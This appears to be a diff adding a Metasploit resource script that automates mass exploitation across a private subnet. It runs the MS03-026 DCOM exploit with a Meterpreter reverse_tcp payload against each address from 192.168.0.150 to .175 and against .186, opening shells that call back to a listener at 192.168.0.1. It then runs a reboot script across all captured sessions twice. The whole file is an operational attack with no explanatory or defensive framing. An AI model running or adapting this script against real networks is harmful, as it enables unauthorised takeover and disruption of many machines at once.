@@ -1,0 +1,221 @@
+use exploit/windows/dcerpc/ms03_026_dcom
+set PAYLOAD windows/meterpreter/reverse_tcp
+
+
+# Don't use AutoRunScript because that triggers when interactive use or first sessions -i is done
+# which would cause the script to be run twice
+
+set LHOST 192.168.0.1
+
+
+
+set RHOST 192.168.0.150
+
+exploit -z
+sessions -l
+
+#+=+=+=+=+=+=+=+=+=+=+=+
+
+set RHOST 192.168.0.151
+
+exploit -z
+sessions -l
+
+#+=+=+=+=+=+=+=+=+=+=+=+
+
+set RHOST 192.168.0.152
+
+exploit -z
+sessions -l
+
+#+=+=+=+=+=+=+=+=+=+=+=+
+
+set RHOST 192.168.0.153
+
+exploit -z
+sessions -l
+
+#+=+=+=+=+=+=+=+=+=+=+=+
+
+set RHOST 192.168.0.154
+
+exploit -z
+sessions -l
+
+#+=+=+=+=+=+=+=+=+=+=+=+
+
+set RHOST 192.168.0.155
+
+exploit -z
+sessions -l
+
+#+=+=+=+=+=+=+=+=+=+=+=+
+
+set RHOST 192.168.0.156
+
+exploit -z
+sessions -l
+
+#+=+=+=+=+=+=+=+=+=+=+=+
+
+set RHOST 192.168.0.157
+
+exploit -z
+sessions -l
+
+#+=+=+=+=+=+=+=+=+=+=+=+
+
+set RHOST 192.168.0.158
+
+exploit -z
+sessions -l
+
+#+=+=+=+=+=+=+=+=+=+=+=+
+
+set RHOST 192.168.0.159
+
+exploit -z
+sessions -l
+
+#+=+=+=+=+=+=+=+=+=+=+=+
+
+set RHOST 192.168.0.160
+
+exploit -z
+sessions -l
+
+#+=+=+=+=+=+=+=+=+=+=+=+
+
+set RHOST 192.168.0.161
+
+exploit -z
+sessions -l
+
+#+=+=+=+=+=+=+=+=+=+=+=+
+
+set RHOST 192.168.0.162
+
+exploit -z
+sessions -l
+
+#+=+=+=+=+=+=+=+=+=+=+=+
+
+set RHOST 192.168.0.163
+
+exploit -z
+sessions -l
+
+#+=+=+=+=+=+=+=+=+=+=+=+
+
+set RHOST 192.168.0.164
+
+exploit -z
+sessions -l
+
+#+=+=+=+=+=+=+=+=+=+=+=+
+
+set RHOST 192.168.0.165
+
+exploit -z
+sessions -l
+
+#+=+=+=+=+=+=+=+=+=+=+=+
+
+set RHOST 192.168.0.166
+
+exploit -z
+sessions -l
+
+#+=+=+=+=+=+=+=+=+=+=+=+
+
+set RHOST 192.168.0.167
+
+exploit -z
+sessions -l
+
+#+=+=+=+=+=+=+=+=+=+=+=+
+
+set RHOST 192.168.0.168
+
+exploit -z
+sessions -l
+
+#+=+=+=+=+=+=+=+=+=+=+=+
+
+set RHOST 192.168.0.169
+
+exploit -z
+sessions -l
+
+#+=+=+=+=+=+=+=+=+=+=+=+
+
+set RHOST 192.168.0.170
+
+exploit -z
+sessions -l
+
+#+=+=+=+=+=+=+=+=+=+=+=+
+
+set RHOST 192.168.0.171
+
+exploit -z
+sessions -l
+
+#+=+=+=+=+=+=+=+=+=+=+=+
+
+set RHOST 192.168.0.172
+
+exploit -z
+sessions -l
+
+#+=+=+=+=+=+=+=+=+=+=+=+
+
+set RHOST 192.168.0.173
+
+exploit -z
+sessions -l
+
+#+=+=+=+=+=+=+=+=+=+=+=+
+
+set RHOST 192.168.0.174
+
+exploit -z
+sessions -l
+
+#+=+=+=+=+=+=+=+=+=+=+=+
+
+set RHOST 192.168.0.175
+
+exploit -z
+sessions -l
+
+
+#+=+=+=+=+=+=+=+=+=+=+=+
+
+set RHOST 192.168.0.186
+
+exploit -z
+sessions -l
+
+
+
+
+
+~_~_~_~_~_~_~_~_~_~_~_~_
+
+sleep 2
+
+sessions -s Meterpreter_Reboot.rb
+
+sleep 30
+
+# Dead (machines that did reboot for us) will be ignored
+# Second restart just to get any missed sessions
+sessions -l
+sessions -s Metrpreter_Reboot.rb
+
+sleep 30
+
+sessions -l
+
+exit -y
